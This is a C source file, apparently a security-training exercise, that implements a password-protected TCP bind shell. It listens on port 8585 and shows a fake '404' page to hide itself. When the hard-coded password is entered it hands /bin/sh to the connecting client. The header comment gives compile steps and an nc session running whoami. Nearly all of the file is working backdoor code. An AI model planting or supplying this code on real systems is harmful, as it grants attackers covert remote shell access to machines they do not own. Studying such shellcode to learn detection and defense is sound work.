/*
 * Shell Bind TCP with password
 * Author Liviu I. 
 *
 * License http://creativecommons.org/licenses/by-sa/3.0/
 * Legitimate use and research only
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE;
 *
 *
 *  Server: listen for incoming connections and spawns a shell
 *  
 *  $ gcc -Wall shell_bind_tcp_passw.c -o shell_bind_tcp_passw
 *  $ ./shell_bind_tcp_passw 
 *  Created accept socket: 5
 *  Received: s3cr37
 *  Ź�Correct password. Opening shell...
 *
 *  And in the client:
 *  # nc -nvv 192.168.56.1 8585
 *  (UNKNOWN) [192.168.56.1] 8585 (?) open
 *  <html>
 *  <body>
 *  	<h1>Error 404 - Try elsewhere</h1>
 *  
 *  </body>
 *  </html>
 *  s3cr37
 *  whoami
 *  liv
 *
 */

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>

/* receiving password buffer size */
#define     BUFSIZE      10

/* Listening port */
#define     PORT         8585

/* Password prompt */
char prompt[] =  \
    "<html>\n"
    "<body>\n"
    "	<h1>Error 404 - Try elsewhere</h1>\n"
    "\n" 
    "</body>\n"
    "</html>\n";

char password[] = "s3cr37";

int main() {
    int listenfd = 0, connfd = 0;    
    int ret = 0;
    char buffer[BUFSIZE];

    struct sockaddr_in serv_addr;

    // Create an un-named socket. returns socket descriptor
    listenfd = socket(AF_INET, SOCK_STREAM, 0);

    memset(&serv_addr, '0', sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(PORT);

    bind(listenfd, (struct sockaddr*) &serv_addr, sizeof(serv_addr));

    // Listen on the created socket for maximum 1 client connection
    listen(listenfd, 1);

    // Sleep waiting for client requests
    connfd = accept(listenfd, (struct sockaddr*) NULL, NULL);
    printf("Created accept socket: %d\n", connfd);

    // Send fake prompt and wait for the password
    ret = send(connfd, prompt, strlen(prompt), 0); 
    if (-1 == ret) {
        printf("Send failed: %s\n", strerror(errno));
        return 1;
    }

    // Read password
    ret = recv(connfd, buffer, BUFSIZE, 0);
    if (-1 == ret) {
        printf("Recv failed: %s\n", strerror(errno));
        return 1;
    } else {
        printf("Received: %s", buffer);
    }

    // Compare
    if (!strncmp(buffer, password, strlen(password))){
        printf("Correct password. Opening shell...\n");    
    } else {
        close(listenfd);
        close(connfd);
        return 1;
    }

    // Duplicate stdin, stdout, stderr
    ret = dup2(connfd, 0);
    if (-1 == ret) {
        printf("STDIN duplication failed: %s\n", strerror(errno));
        return 1;
    }

    ret = dup2(connfd, 1);
    if (-1 == ret) {
        printf("STDOUT duplication failed: %s\n", strerror(errno));
        return 1;
    }

    ret = dup2(connfd, 2);
    if (-1 == ret) {
        printf("STDERR duplication failed: %s\n", strerror(errno));
        return 1;
    }

    // Replace process image
    char *args[2];
    args[0] = "/bin/sh";
    args[1] = NULL;      // Needs to ne a NULL terminated list of args

    ret = execve(args[0], args, NULL);
    if (-1 == ret) {
        printf("Execve failed: %s\n", strerror(errno));
        return 1;
    }

    return 0;
}
